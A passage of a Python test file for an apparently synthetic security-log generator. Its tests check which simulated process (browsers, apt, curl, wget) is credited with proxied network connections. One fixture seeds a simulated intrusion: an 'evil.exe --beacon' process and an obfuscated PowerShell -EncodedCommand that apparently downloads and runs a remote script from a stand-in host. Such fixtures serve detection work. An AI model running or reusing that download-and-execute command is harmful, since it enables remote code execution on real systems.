    def test_connect_target_browser_hint_ignores_oversized_port_literal(self):
        generator = ActivityGenerator(StateManager(), {})

        image, command_line = generator._browser_http_client_process_hint(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
            ),
            hostname="r.bing.com",
            uri=f"r.bing.com:{'9' * 5000}",
            dst_port=8080,
        )

        assert image.endswith(r"\Microsoft\Edge\Application\msedge.exe")
        assert command_line.endswith("https://r.bing.com:8080/")

    def test_connect_target_browser_hint_ignores_out_of_range_port(self):
        generator = ActivityGenerator(StateManager(), {})

        image, command_line = generator._browser_http_client_process_hint(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
            ),
            hostname="r.bing.com",
            uri="r.bing.com:99999",
            dst_port=8080,
        )

        assert image.endswith(r"\Microsoft\Edge\Application\msedge.exe")
        assert command_line.endswith("https://r.bing.com:8080/")

    def test_opera_user_agent_does_not_map_to_chrome_process(self):
        generator = ActivityGenerator(StateManager(), {})

        image, command_line = generator._browser_http_client_process_hint(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
            ),
            hostname="www.example.com",
            uri="/",
            dst_port=80,
        )

        assert image.endswith(r"\Opera\opera.exe")
        assert "chrome.exe" not in command_line.lower()

    def test_browser_proxy_user_agent_replaces_mismatched_browser_pid(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        ie_image = r"C:\Program Files\Internet Explorer\iexplore.exe"
        stale_ie_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=ie_image,
            command_line=f'"{ie_image}" https://www.example.com/',
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="r.bing.com:443",
                host="r.bing.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="204.79.197.200",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=stale_ie_pid,
            source_system=workstation,
            hostname="r.bing.com",
            conn_state="SF",
            process_image=ie_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != stale_ie_pid
        assert client_event.process.image.endswith(r"\Microsoft\Edge\Application\msedge.exe")
        assert client_event.process.command_line.endswith("https://r.bing.com/")

    def test_browser_http_repair_replaces_mismatched_browser_pid(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _svchost_pid, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        ie_image = r"C:\Program Files\Internet Explorer\iexplore.exe"
        stale_ie_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=ie_image,
            command_line=f'"{ie_image}" https://www.example.com/',
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        event_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        event = SecurityEvent(
            timestamp=event_time,
            event_type="connection",
            src_host=HostContext(
                hostname=workstation.hostname,
                ip=workstation.ip,
                os=workstation.os,
                os_category="windows",
                system_type=workstation.type,
            ),
            network=NetworkContext(
                src_ip=workstation.ip,
                src_port=53077,
                dst_ip="10.0.3.10",
                dst_port=8080,
                protocol="tcp",
                initiating_pid=stale_ie_pid,
            ),
            http=HttpContext(
                method="GET",
                host="r.bing.com",
                uri="/rp/000000007fbbafbd.css",
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
                ),
                status_code=200,
                response_body_len=4096,
            ),
        )

        generator._repair_browser_http_process_attribution(
            event,
            source_system=workstation,
            time=event_time,
        )

        assert event.process is not None
        assert event.process.pid != stale_ie_pid
        assert event.process.image.endswith(r"\Microsoft\Edge\Application\msedge.exe")

    def test_browser_proxy_user_agent_preserves_valid_storyline_process(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        evil_image = r"C:\Users\alex.morgan\AppData\Roaming\evil.exe"
        storyline_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=evil_image,
            command_line=r'"C:\Users\alex.morgan\AppData\Roaming\evil.exe" --beacon',
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="cdn-assets-update.com:443",
                host="cdn-assets-update.com",
                status_code=200,
                sc_bytes=4800,
                cs_bytes=420,
                time_taken=1200,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/121.0.0.0 Safari/537.36"
                ),
                content_type="text/plain",
                cache_result="MISS",
                referrer="",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="45.33.32.30",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=storyline_pid,
            source_system=workstation,
            hostname="cdn-assets-update.com",
            conn_state="SF",
            process_image=evil_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid == storyline_pid
        assert client_event.process.pid == client_event.network.initiating_pid
        assert client_event.process.username == user.username
        assert client_event.process.image == evil_image

    def test_matching_caller_proxy_process_is_preserved_for_storyline_download(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        powershell_image = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 9, 58, 0, tzinfo=UTC))
        stale_user_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=powershell_image,
            command_line=(
                "powershell.exe -NoProfile -Command "
                "\"Invoke-WebRequest -Proxy 'http://PROXY-01.example.org:8080' "
                "-Uri 'https://cdn-assets-update.com/' -UseBasicParsing\""
            ),
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
        storyline_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=4,
            image=powershell_image,
            command_line=(
                "powershell.exe -NoProfile -EncodedCommand "
                "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABp"
                "AGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AH"
                "AAcwA6AC8ALwBjAGQAbgAtAGEAcwBzAGUAdABzAC0AdQBwAGQAYQB0AGUALgBjAG8A"
                "bQAvAGgAZQBhAGwAdABoAC4AcABzADEAIgApAA=="
            ),
            username="SYSTEM",
            integrity_level="System",
            logon_id="0x3e7",
        )
        assert stale_user_pid != storyline_pid
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="https://cdn-assets-update.com/health.ps1",
                host="cdn-assets-update.com",
                status_code=200,
                sc_bytes=4800,
                cs_bytes=420,
                time_taken=1200,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1",
                content_type="text/plain",
                cache_result="MISS",
                referrer="",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="45.33.32.30",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=storyline_pid,
            source_system=workstation,
            hostname="cdn-assets-update.com",
            conn_state="SF",
            process_image=powershell_image,
            http=HttpContext(
                method="GET",
                host="cdn-assets-update.com",
                uri="/health.ps1",
                version="1.1",
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["text/plain"],
            ),
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid == storyline_pid
        assert client_event.process.pid == client_event.network.initiating_pid
        assert client_event.process.username == "SYSTEM"
        assert client_event.process.command_line.endswith("AA==")

    def test_browser_proxy_user_agent_replaces_unrelated_chat_app_pid(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        slack_image = r"C:\Users\alex.morgan\AppData\Local\slack\slack.exe"
        slack_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=slack_image,
            command_line="slack.exe",
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="r.bing.com:443",
                host="r.bing.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="204.79.197.200",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=slack_pid,
            source_system=workstation,
            hostname="r.bing.com",
            conn_state="SF",
            process_image=slack_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != slack_pid
        assert client_event.process.image.endswith(r"\Microsoft\Edge\Application\msedge.exe")

    def test_browser_proxy_user_agent_replaces_unrelated_dropbox_pid(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _, explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        dropbox_image = r"C:\Program Files (x86)\Dropbox\Client\Dropbox.exe"
        dropbox_pid = generator.state_manager.create_process(
            system=workstation.hostname,
            parent_pid=explorer_pid,
            image=dropbox_image,
            command_line=r'"C:\Program Files (x86)\Dropbox\Client\Dropbox.exe" /systemstartup',
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="www.github.com:443",
                host="www.github.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="140.82.112.4",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=dropbox_pid,
            source_system=workstation,
            hostname="www.github.com",
            conn_state="SF",
            process_image=dropbox_image,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != dropbox_pid
        assert client_event.process.image.endswith(r"\Google\Chrome\Application\chrome.exe")

    def test_linux_package_proxy_user_agent_replaces_unrelated_git_pid(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, linux_system, shell_pid = _seed_linux_proxy_client_user_session(generator)
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        git_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=shell_pid,
            image="/usr/bin/git",
            command_line="git status",
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=linux_system.ip,
                method="CONNECT",
                url="changelogs.ubuntu.com:443",
                host="changelogs.ubuntu.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent="apt-http/2.4.11 (amd64)",
                content_type="",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip="91.189.91.48",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=git_pid,
            source_system=linux_system,
            hostname="changelogs.ubuntu.com",
            conn_state="SF",
            process_image="/usr/bin/git",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != git_pid
        assert client_event.process.image == "/usr/lib/apt/methods/https"
        assert client_event.process.command_line == "/usr/lib/apt/methods/https"
        assert client_event.process.username == "root"
        assert client_event.process.logon_id != user_session.logon_id

    def test_linux_package_proxy_client_uses_system_owner_after_session_logout(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        _user, linux_system, shell_pid = _seed_linux_proxy_client_user_session(generator)
        shell_proc = generator.state_manager.get_process(linux_system.hostname, shell_pid)
        assert shell_proc is not None
        logon_id = shell_proc.logon_id
        request_time = datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC)
        generator.state_manager.end_session(
            logon_id,
            request_time - timedelta(seconds=30),
        )
        proxy = generator._ip_to_system["10.0.3.10"]

        pid, image = generator._ensure_explicit_proxy_client_process(
            source_system=linux_system,
            time=request_time,
            proxy_context=ProxyContext(
                client_ip=linux_system.ip,
                method="CONNECT",
                url="changelogs.ubuntu.com:443",
                host="changelogs.ubuntu.com",
                status_code=200,
                user_agent="apt-http/2.4.11 (amd64)",
                proxy_fqdn="PROXY-01.example.org",
            ),
            proxy_sys=proxy,
            dst_port=443,
        )

        proc = generator.state_manager.get_process(linux_system.hostname, pid)
        assert image == "/usr/lib/apt/methods/https"
        assert proc is not None
        assert proc.username == "root"
        assert proc.logon_id != logon_id
        assert proc.parent_pid != shell_pid
        parent = generator.state_manager.get_process(linux_system.hostname, proc.parent_pid)
        assert parent is not None
        assert parent.image == "/usr/lib/systemd/systemd"

    def test_linux_background_helper_process_drops_ended_user_session_parent(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, linux_system, shell_pid = _seed_linux_proxy_client_user_session(generator)
        shell_proc = generator.state_manager.get_process(linux_system.hostname, shell_pid)
        assert shell_proc is not None
        systemd_pid = shell_proc.parent_pid
        logon_id = shell_proc.logon_id
        request_time = datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC)
        generator.state_manager.end_session(
            logon_id,
            request_time - timedelta(seconds=30),
        )

        pid = generator.generate_process(
            user=user,
            system=linux_system,
            time=request_time,
            logon_id=logon_id,
            process_name="/usr/lib/apt/methods/https",
            command_line="/usr/lib/apt/methods/https",
            parent_pid=shell_pid,
            suppress_command_file_effect=True,
        )

        proc = generator.state_manager.get_process(linux_system.hostname, pid)
        assert proc is not None
        assert proc.username == "root"
        assert proc.logon_id == "0x3e7"
        assert proc.parent_pid == systemd_pid

    def test_linux_proxy_replaces_bad_caller_with_tool_owner(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        linux_system = System(
            hostname="LINUX-APP-01",
            ip="10.0.1.10",
            os="Ubuntu 24.04",
            type="server",
        )
        generator._ip_to_system[linux_system.ip] = linux_system
        generator._proxy_routes[linux_system.ip] = [generator._ip_to_system["10.0.3.10"]]
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 9, 55, 0, tzinfo=UTC))
        systemd_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=0,
            image="/usr/lib/systemd/systemd",
            command_line="/usr/lib/systemd/systemd",
            username="root",
            integrity_level="System",
        )
        bash_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=systemd_pid,
            image="/bin/bash",
            command_line="-bash",
            username="root",
            integrity_level="Medium",
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=linux_system.ip,
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent="curl/8.4.0",
                content_type="",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=bash_pid,
            source_system=linux_system,
            hostname="example.com",
            conn_state="SF",
            process_image="/bin/bash",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.image == "/usr/bin/curl"
        assert client_event.process.username == "root"
        assert client_event.network.initiating_pid != bash_pid

    def test_linux_proxy_replaces_service_daemon_for_tool_user_agent(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        linux_system = System(
            hostname="WEB-EXT-01",
            ip="10.0.1.10",
            os="Ubuntu 24.04",
            type="server",
        )
        generator._ip_to_system[linux_system.ip] = linux_system
        generator._proxy_routes[linux_system.ip] = [generator._ip_to_system["10.0.3.10"]]
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 9, 55, 0, tzinfo=UTC))
        apache_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=0,
            image="/usr/sbin/apache2",
            command_line="/usr/sbin/apache2 -DFOREGROUND",
            username="www-data",
            integrity_level="Medium",
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=linux_system.ip,
                method="CONNECT",
                url="api.github.com:443",
                host="api.github.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent="python-requests/2.31.0",
                content_type="",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip="140.82.112.6",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=apache_pid,
            source_system=linux_system,
            hostname="api.github.com",
            conn_state="SF",
            process_image="/usr/sbin/apache2",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.image == "/usr/bin/python3"
        assert client_event.process.username == "root"
        assert client_event.network.initiating_pid != apache_pid

    def test_explicit_proxy_tunnel_reuse_is_user_agent_scoped(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        workstation = generator._ip_to_system["10.0.1.10"]
        generator._build_proxy_context = Mock(
            side_effect=[
                ProxyContext(
                    client_ip=workstation.ip,
                    method="CONNECT",
                    url="example.com:443",
                    host="example.com",
                    status_code=200,
                    sc_bytes=220,
                    cs_bytes=340,
                    time_taken=900,
                    user_agent=(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
                        "Gecko/20100101 Firefox/121.0"
                    ),
                    content_type="",
                    cache_result="MISS",
                    referrer="-",
                    proxy_fqdn="PROXY-01.example.org",
                ),
                ProxyContext(
                    client_ip=workstation.ip,
                    method="CONNECT",
                    url="example.com:443",
                    host="example.com",
                    status_code=200,
                    sc_bytes=220,
                    cs_bytes=340,
                    time_taken=900,
                    user_agent=(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
                    ),
                    content_type="",
                    cache_result="MISS",
                    referrer="-",
                    proxy_fqdn="PROXY-01.example.org",
                ),
            ]
        )

        for second in (0, 10):
            generator.generate_connection(
                src_ip=workstation.ip,
                dst_ip="93.184.216.34",
                time=datetime(2024, 1, 15, 10, 0, second, tzinfo=UTC),
                dst_port=443,
                proto="tcp",
                service="ssl",
                duration=1.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=workstation,
                hostname="example.com",
                conn_state="SF",
            )

        client_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == workstation.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        ]

        assert len(client_events) == 2
        assert client_events[0].network.zeek_uid != client_events[1].network.zeek_uid

    def test_direct_proxy_listener_flow_replaces_linux_shell_with_service_owner(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        linux_system = System(
            hostname="DB-PROD-01",
            ip="10.0.1.10",
            os="Ubuntu 24.04",
            type="server",
        )
        proxy = generator._ip_to_system["10.0.3.10"]
        generator._ip_to_system[linux_system.ip] = linux_system
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 9, 55, 0, tzinfo=UTC))
        systemd_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=0,
            image="/usr/lib/systemd/systemd",
            command_line="/usr/lib/systemd/systemd",
            username="root",
            integrity_level="System",
        )
        bash_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=systemd_pid,
            image="/bin/bash",
            command_line="-bash",
            username="root",
            integrity_level="Medium",
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip=proxy.ip,
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=8080,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=bash_pid,
            source_system=linux_system,
            hostname=generator._proxy_fqdn(proxy),
            conn_state="SF",
            process_image="/bin/bash",
            http=HttpContext(
                method="CONNECT",
                host="example.com",
                uri="example.com:443",
                version="1.1",
                user_agent="Wget/1.21.3",
                status_code=200,
                status_msg="Connection Established",
            ),
            proxy_bypass=True,
            preserve_http_outcome=True,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == proxy.ip
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.image == "/usr/bin/wget"
        assert client_event.process.username == "root"
        assert client_event.network.initiating_pid != bash_pid

    def test_direct_proxy_listener_flow_replaces_mismatched_linux_browser(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, linux_system, shell_pid = _seed_linux_proxy_client_user_session(generator)
        proxy = generator._ip_to_system["10.0.3.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        firefox_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=shell_pid,
            image="/usr/bin/firefox",
            command_line="firefox -P default",
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip=proxy.ip,
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=8080,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=firefox_pid,
            source_system=linux_system,
            hostname=generator._proxy_fqdn(proxy),
            conn_state="SF",
            process_image="/usr/bin/firefox",
            http=HttpContext(
                method="CONNECT",
                host="example.com",
                uri="example.com:443",
                version="1.1",
                user_agent=(
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ),
                status_code=200,
                status_msg="Connection Established",
            ),
            proxy_bypass=True,
            preserve_http_outcome=True,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == proxy.ip
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != firefox_pid
        assert client_event.process.image == "/usr/bin/google-chrome"

    def test_direct_proxy_listener_flow_replaces_unrelated_linux_kubectl_owner(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, linux_system, shell_pid = _seed_linux_proxy_client_user_session(generator)
        proxy = generator._ip_to_system["10.0.3.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
